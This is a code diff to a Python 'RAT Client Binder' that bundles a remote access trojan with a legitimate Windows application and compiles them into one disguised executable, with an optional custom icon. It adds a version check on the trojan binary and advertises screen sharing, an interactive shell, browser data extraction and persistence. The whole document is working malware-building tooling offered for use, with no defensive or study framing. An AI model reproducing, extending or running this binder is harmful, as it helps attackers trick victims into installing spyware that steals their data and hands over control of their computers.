@@ -101,14 +101,56 @@ def print_binder_banner():
 
 def print_binder_info():
     """Print binder-specific information"""
-    print(f"{Fore.CYAN}RAT Client Binder{Style.RESET_ALL}")
-    print(f"{Fore.YELLOW}Bind RAT client with legitimate applications{Style.RESET_ALL}\n")
+    print(f"{Fore.CYAN}RAT Client Binder v1.6{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}Bind RAT client v1.6 with legitimate applications{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}✅ Supports: Screen Sharing, Interactive Shell, Process Control{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}✅ Compatible: Network Monitoring, Browser Data, Persistence{Style.RESET_ALL}\n")
 
 def validate_file_exists(filepath):
     if not os.path.isfile(filepath):
         print(f"{Fore.RED}Error: File {filepath} does not exist!{Style.RESET_ALL}")
         return False
     return True
+
+def check_v16_compatibility(filepath):
+    """Check if the RAT client appears to be v1.6 with screen sharing capabilities"""
+    try:
+        file_size = os.path.getsize(filepath)
+        
+        # Read first few KB to check for v1.6 indicators
+        with open(filepath, 'rb') as f:
+            header_data = f.read(8192)  # Read first 8KB
+            
+        # Convert to string for searching (ignore encoding errors)
+        header_str = header_data.decode('utf-8', errors='ignore').lower()
+        
+        # Check for v1.6 indicators
+        v16_indicators = [
+            'gdiplus',          # GDI+ for screen sharing
+            'screen_sharing',   # Screen sharing functions
+            'jpeg',            # JPEG compression
+            'interactive_shell', # Interactive shell
+            'capture_screen',   # Screen capture
+            'bitmap'           # Bitmap operations
+        ]
+        
+        found_indicators = []
+        for indicator in v16_indicators:
+            if indicator in header_str:
+                found_indicators.append(indicator)
+        
+        # Determine compatibility level
+        if len(found_indicators) >= 3:
+            return "v1.6_confirmed", found_indicators
+        elif len(found_indicators) >= 1:
+            return "v1.6_likely", found_indicators
+        elif file_size > 1000000:  # > 1MB suggests newer version
+            return "v1.6_possible", ["large_file_size"]
+        else:
+            return "older_version", []
+            
+    except Exception as e:
+        return "unknown", [f"error: {str(e)}"]
 
 def bind_files(rat_client, legitimate_app, output_file, custom_icon=None):
     print(f"{Fore.CYAN}Binding files...{Style.RESET_ALL}")
@@ -123,7 +165,7 @@ def bind_files(rat_client, legitimate_app, output_file, custom_icon=None):
         # Compile the binder if needed
         if not os.path.exists("rat_client_binder.exe"):
             print(f"{Fore.YELLOW}Compiling binder...{Style.RESET_ALL}")
-            compile_cmd = "g++ -o rat_client_binder.exe rat_client_binder.cpp -lws2_32 -static-libgcc -static-libstdc++"
+            compile_cmd = "g++ -o rat_client_binder.exe binder_stub.cpp -lws2_32 -static-libgcc -static-libstdc++ -static"
             result = subprocess.run(compile_cmd, shell=True, capture_output=True, text=True)
             if result.returncode != 0:
                 print(f"{Fore.RED}Compilation failed:{Style.RESET_ALL}")
@@ -187,9 +229,13 @@ def bind_files(rat_client, legitimate_app, output_file, custom_icon=None):
                 print(result.stderr)
                 return False
         
-        # Compile the final executable with static linking
-        print(f"{Fore.YELLOW}Creating final executable...{Style.RESET_ALL}")
-        compile_cmd = f'g++ -o "{output_file}" rat_client_binder.cpp {os.path.join(temp_dir, "resources.o")} -lws2_32 -mwindows -static-libgcc -static-libstdc++'
+        # Compile the final executable with static linking using the binder stub
+        print(f"{Fore.YELLOW}Creating final executable with v1.6 compatibility...{Style.RESET_ALL}")
+        
+        # Use binder_stub.cpp as the primary source
+        binder_source = "binder_stub.cpp"
+        
+        compile_cmd = f'g++ -o "{output_file}" {binder_source} {os.path.join(temp_dir, "resources.o")} -lws2_32 -mwindows -static-libgcc -static-libstdc++ -static -O2'
         result = subprocess.run(compile_cmd, shell=True, capture_output=True, text=True)
         
         if result.returncode != 0:
@@ -220,11 +266,34 @@ def main():
     # Get user input
     print(f"{Fore.YELLOW}Enter the file paths:{Style.RESET_ALL}")
     
-    rat_client = input(f"{Fore.CYAN}RAT client executable: {Style.RESET_ALL}")
+    rat_client = input(f"{Fore.CYAN}RAT client v1.6 executable (from RAT_Client_Generator): {Style.RESET_ALL}")
     if not validate_file_exists(rat_client):
         return
     
-    legitimate_app = input(f"{Fore.CYAN}Legitimate application: {Style.RESET_ALL}")
+    # Check v1.6 compatibility
+    print(f"{Fore.YELLOW}🔍 Analyzing RAT client for v1.6 compatibility...{Style.RESET_ALL}")
+    compatibility, indicators = check_v16_compatibility(rat_client)
+    
+    if compatibility == "v1.6_confirmed":
+        print(f"{Fore.GREEN}✅ RAT client v1.6 confirmed! Found indicators: {', '.join(indicators)}{Style.RESET_ALL}")
+    elif compatibility == "v1.6_likely":
+        print(f"{Fore.YELLOW}⚠️  Likely RAT client v1.6. Found indicators: {', '.join(indicators)}{Style.RESET_ALL}")
+    elif compatibility == "v1.6_possible":
+        print(f"{Fore.YELLOW}⚠️  Possibly RAT client v1.6 (large file size suggests newer version){Style.RESET_ALL}")
+    elif compatibility == "older_version":
+        print(f"{Fore.RED}⚠️  Warning: This appears to be an older RAT client version!{Style.RESET_ALL}")
+        print(f"{Fore.RED}   v1.6 features (screen sharing, interactive shell) may not work.{Style.RESET_ALL}")
+        confirm = input(f"{Fore.YELLOW}Continue with potentially older version? (y/N): {Style.RESET_ALL}")
+        if confirm.lower() != 'y':
+            return
+    else:
+        print(f"{Fore.YELLOW}⚠️  Could not determine RAT client version. Proceeding with caution.{Style.RESET_ALL}")
+        if indicators and indicators[0].startswith("error"):
+            print(f"{Fore.RED}   Analysis error: {indicators[0]}{Style.RESET_ALL}")
+    
+    print()  # Add spacing
+    
+    legitimate_app = input(f"{Fore.CYAN}Legitimate application (.exe): {Style.RESET_ALL}")
     if not validate_file_exists(legitimate_app):
         return
     
@@ -241,13 +310,26 @@ def main():
     
     # Bind the files
     print(f"\n{Fore.YELLOW}Binding files with the following settings:{Style.RESET_ALL}")
-    print(f"{Fore.WHITE}RAT client: {rat_client}{Style.RESET_ALL}")
+    print(f"{Fore.WHITE}RAT client v1.6: {rat_client}{Style.RESET_ALL}")
     print(f"{Fore.WHITE}Legitimate application: {legitimate_app}{Style.RESET_ALL}")
     print(f"{Fore.WHITE}Output filename: {output_file}{Style.RESET_ALL}")
     if custom_icon:
         print(f"{Fore.WHITE}Custom icon: {custom_icon}{Style.RESET_ALL}")
     
-    bind_files(rat_client, legitimate_app, output_file, custom_icon if custom_icon else None)
+    print(f"\n{Fore.CYAN}🔧 Binding RAT client v1.6 with advanced features...{Style.RESET_ALL}")
+    success = bind_files(rat_client, legitimate_app, output_file, custom_icon if custom_icon else None)
+    
+    if success:
+        print(f"\n{Fore.GREEN}✅ Successfully created bound executable with v1.6 features:{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}   • Screen sharing (10 FPS JPEG streaming){Style.RESET_ALL}")
+        print(f"{Fore.GREEN}   • Interactive shell sessions{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}   • Advanced process control{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}   • Network monitoring capabilities{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}   • Browser data extraction{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}   • Persistence mechanisms{Style.RESET_ALL}")
+        print(f"\n{Fore.YELLOW}📁 Output: {output_file}{Style.RESET_ALL}")
+    else:
+        print(f"\n{Fore.RED}❌ Binding failed. Check the error messages above.{Style.RESET_ALL}")
 
 if __name__ == "__main__":
     main()
